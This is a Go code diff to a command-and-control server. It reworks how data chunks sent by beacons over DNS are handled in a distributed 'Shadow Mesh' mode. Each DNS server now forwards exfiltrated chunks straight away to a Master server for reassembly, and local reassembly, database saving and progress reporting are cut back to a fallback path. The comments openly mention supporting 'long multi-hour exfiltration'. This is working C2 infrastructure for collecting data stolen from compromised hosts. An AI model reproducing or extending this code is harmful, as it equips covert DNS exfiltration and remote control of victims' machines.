@@ -1159,6 +1159,8 @@ func (c2 *C2Manager) handleResultMeta(parts []string, isDuplicate bool) string {
 }
 
 // handleData processes data chunks from beacon (two-phase protocol)
+// In Shadow Mesh mode, chunks are distributed across multiple DNS servers
+// Each server forwards chunks immediately to Master for reassembly
 func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 	if len(parts) < 5 {
 		return "ERROR"
@@ -1169,182 +1171,61 @@ func (c2 *C2Manager) handleData(parts []string, isDuplicate bool) string {
 	chunkIndex, _ := strconv.Atoi(parts[3])
 	data := parts[4]
 
-	// Check if we're expecting this data (read lock only)
+	// Check if we're expecting this data (or if task exists)
 	c2.mutex.RLock()
-	expected, exists := c2.expectedResults[taskID]
-	if !exists {
-		// Check if task already completed (duplicate chunk after completion)
-		task, taskExists := c2.tasks[taskID]
-		c2.mutex.RUnlock()
-
-		if taskExists && task.Status == "completed" {
-			// Task already completed, this is a duplicate chunk - silently ACK
-			if c2.debug {
-				logf("[DEBUG] Received duplicate DATA chunk for completed task %s", taskID)
-			}
-			return "ACK"
-		}
-		// Unknown task, log warning only if not a duplicate message
-		if !isDuplicate {
-			logf("[C2] Warning: Received DATA chunk for unknown task %s", taskID)
-		}
-		return "ERROR"
+	expected, hasExpectation := c2.expectedResults[taskID]
+	task, taskExists := c2.tasks[taskID]
+	totalChunks := 0
+	if hasExpectation {
+		totalChunks = expected.TotalChunks
 	}
 	c2.mutex.RUnlock()
 
-	// Store the chunk (write lock only for the update)
-	c2.mutex.Lock()
-	if chunkIndex > 0 && chunkIndex <= expected.TotalChunks {
-		// Only update if this is a new chunk (not a duplicate)
-		if expected.ReceivedData[chunkIndex-1] == "" {
-			expected.ReceivedData[chunkIndex-1] = data
-			expected.LastChunkIndex = chunkIndex
-			// Update timestamp to prevent timeout during long multi-hour exfiltration
-			expected.ReceivedAt = time.Now()
+	// If no expectation and task is completed, this is a duplicate
+	if !hasExpectation && taskExists && task.Status == "completed" {
+		if c2.debug {
+			logf("[DEBUG] Received duplicate DATA chunk for completed task %s", taskID)
 		}
-	} else {
-		c2.mutex.Unlock()
-		logf("[C2] Warning: Invalid chunk index %d for task %s (expected 1-%d)",
-			chunkIndex, taskID, expected.TotalChunks)
-		return "ERROR"
+		return "ACK"
 	}
 
-	// Check if we have all chunks (still under write lock)
-	complete := true
-	receivedCount := 0
-	for i := 0; i < expected.TotalChunks; i++ {
-		if expected.ReceivedData[i] != "" {
-			receivedCount++
-		} else {
-			complete = false
-		}
+	// SHADOW MESH: Forward chunk IMMEDIATELY to Master (don't wait for all chunks)
+	// Master will handle reassembly from chunks received by ALL DNS servers
+	if masterClient != nil {
+		go func(tid, bid string, chunkIdx, total int, chunkData string) {
+			// Get the master task ID
+			c2.mutex.RLock()
+			masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
+			c2.mutex.RUnlock()
+
+			submitTaskID := tid
+			if hasMasterID {
+				submitTaskID = masterTaskID
+			}
+
+			// Forward chunk to Master for reassembly
+			if err := masterClient.SubmitResultChunk(submitTaskID, bid, chunkIdx, total, chunkData); err != nil {
+				if c2.debug {
+					logf("[C2] Failed to forward chunk to master: %v", err)
+				}
+			} else if c2.debug && chunkIdx%10 == 0 {
+				logf("[C2] Forwarded chunk %d/%d to Master for task %s", chunkIdx, total, submitTaskID)
+			}
+		}(taskID, beaconID, chunkIndex, totalChunks, data)
 	}
 
-	// Log progress for large results (every 10 chunks or completion)
-	if !isDuplicate && (receivedCount%10 == 0 || complete) {
-		logf("[C2] Progress: %d/%d chunks received for %s (task %s)",
-			receivedCount, expected.TotalChunks, beaconID, taskID)
-
-		// Report progress to Master Server (if in distributed mode)
-		// Now useful since chunks are distributed across DNS servers
-		if masterClient != nil {
-			go func(tid, bid string, received, total int) {
-				// Get the master task ID
-				c2.mutex.RLock()
-				masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
-				c2.mutex.RUnlock()
-
-				submitTaskID := tid
-				if hasMasterID {
-					submitTaskID = masterTaskID
-				}
-
-				status := "receiving"
-				if received == total {
-					status = "complete"
-				}
-
-				if err := masterClient.SubmitProgress(submitTaskID, bid, received, total, status); err != nil {
-					if c2.debug {
-						logf("[C2] Failed to submit progress to master: %v", err)
-					}
-				}
-			}(taskID, beaconID, receivedCount, expected.TotalChunks)
+	// Local tracking for fallback/redundancy (but don't rely on it for Shadow Mesh)
+	if hasExpectation {
+		c2.mutex.Lock()
+		if chunkIndex > 0 && chunkIndex <= expected.TotalChunks {
+			// Only update if this is a new chunk (not a duplicate)
+			if expected.ReceivedData[chunkIndex-1] == "" {
+				expected.ReceivedData[chunkIndex-1] = data
+				expected.LastChunkIndex = chunkIndex
+				expected.ReceivedAt = time.Now()
+			}
 		}
-	}
-
-	if complete {
-		// Reconstruct the complete result (still under lock, fast operation)
-		result := strings.Join(expected.ReceivedData, "")
-
-		// Update the task
-		task, taskExists := c2.tasks[taskID]
-		if taskExists {
-			task.Result = result
-			task.Status = "completed"
-		}
-
-		// Clean up
-		delete(c2.expectedResults, taskID)
 		c2.mutex.Unlock()
-
-		// Log and save to database (outside lock)
-		if !isDuplicate {
-			logf("[C2] Result complete: %s → %s (%d bytes, %d chunks)", beaconID, taskID, len(result), expected.TotalChunks)
-		}
-
-		// Save result to database (async, outside lock)
-		if c2.db != nil && taskExists {
-			go func(tid, bid, res string, chunks int) {
-				// Save the complete result
-				if err := c2.db.SaveTaskResult(tid, bid, res, 0, 1); err != nil && c2.debug {
-					logf("[C2] Failed to save task result to database: %v", err)
-				}
-				// Update task status
-				if err := c2.db.UpdateTaskStatus(tid, "completed"); err != nil && c2.debug {
-					logf("[C2] Failed to update task status in database: %v", err)
-				}
-			}(taskID, beaconID, result, expected.TotalChunks)
-		}
-
-		// Report complete result to Master Server (if in distributed mode)
-		// For multi-chunk results assembled locally, send the complete result
-		// Master will also reassemble from individual chunks, but this provides redundancy
-		if masterClient != nil && taskExists {
-			go func(tid, bid, res string, totalChunks int) {
-				// Get the master task ID
-				c2.mutex.RLock()
-				masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
-				c2.mutex.RUnlock()
-
-				// Use master task ID if available, otherwise use local ID
-				submitTaskID := tid
-				if hasMasterID {
-					submitTaskID = masterTaskID
-				}
-
-				// Send with chunk_index=0 and total_chunks set to actual count
-				// Master will recognize this as the complete assembled result
-				if err := masterClient.SubmitResult(submitTaskID, bid, 0, totalChunks, res); err != nil {
-					if c2.debug {
-						logf("[C2] Failed to submit assembled result to master: %v", err)
-					}
-				} else if c2.debug {
-					logf("[C2] Submitted assembled result to master: %d chunks, %d bytes", totalChunks, len(res))
-				}
-
-				// Clean up master task ID mapping after successful submission
-				if hasMasterID {
-					c2.mutex.Lock()
-					delete(c2.masterTaskIDs, tid)
-					c2.mutex.Unlock()
-				}
-			}(taskID, beaconID, result, expected.TotalChunks)
-		}
-	} else {
-		c2.mutex.Unlock()
-
-		// Report chunk to Master Server (if in distributed mode) - for progress tracking
-		if masterClient != nil {
-			go func(tid, bid string, chunk int, total int, data string) {
-				// Get the master task ID
-				c2.mutex.RLock()
-				masterTaskID, hasMasterID := c2.masterTaskIDs[tid]
-				c2.mutex.RUnlock()
-
-				// Use master task ID if available, otherwise use local ID
-				submitTaskID := tid
-				if hasMasterID {
-					submitTaskID = masterTaskID
-				}
-
-				if err := masterClient.SubmitResult(submitTaskID, bid, chunk, total, data); err != nil {
-					if c2.debug {
-						logf("[C2] Failed to submit chunk %d/%d to master: %v", chunk, total, err)
-					}
-				}
-			}(taskID, beaconID, chunkIndex, expected.TotalChunks, data)
-		}
 	}
 
 	return "ACK"
